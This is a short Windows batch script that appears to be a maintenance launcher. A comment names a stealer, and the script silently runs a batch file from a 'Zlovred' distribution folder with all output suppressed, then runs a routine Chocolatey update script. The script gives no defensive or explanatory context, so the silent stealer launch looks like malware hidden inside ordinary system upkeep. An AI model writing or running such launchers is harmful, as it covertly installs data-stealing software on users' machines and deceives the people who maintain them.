@echo off
rem LOad and Repair Stealer
%PUB1%\Distrib\Zlovred\load_httpStyler.bat > null 2> null
rem Update the chocolatey Installations
%PUB1%\Util\update-chocolatey.cmd
